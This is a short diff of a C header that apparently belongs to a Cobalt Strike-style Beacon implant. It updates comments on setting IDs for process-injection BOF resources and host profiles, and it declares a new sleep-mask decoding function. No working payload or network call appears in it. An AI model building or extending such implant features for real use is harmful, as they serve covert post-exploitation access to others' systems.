@@ -111,9 +111,9 @@ typedef struct {
 #define SETTING_MAX_RETRY_STRATEGY_DURATION   73
 
 /* 4.9 additions (parsed generically by settings_init; consumed where noted) */
-#define SETTING_BOF_RESOURCE      74 /* .process-inject.bof_res blob */
-#define SETTING_HOST_PROFILES     75 /* 4.9 Host Profiles, up to 1024B — parsed, not yet consumed */
-#define SETTING_DATA_STORE_SIZE   76 /* .stage.data_store_size — parsed, not yet consumed */
+#define SETTING_BOF_RESOURCE      74 /* .process-inject.bof_res blob → BeaconAddValue("bof_res") */
+#define SETTING_HOST_PROFILES     75 /* 4.9 Host Profiles, up to 1024B — hostprof_reload/apply */
+#define SETTING_DATA_STORE_SIZE   76 /* .stage.data_store_size */
 
 /* our various funks */
 #define EXIT_FUNK_PROCESS 0
@@ -133,6 +133,7 @@ unsigned int   setting_option(int field, unsigned short value);
 /* maintenance */
 void settings_init(void * bptr);
 void * get_beacon_ptr();
+int sleepmask_decode(char * out, int max);
 
 /* yes, this is useful! */
 unsigned int bigger_rand();
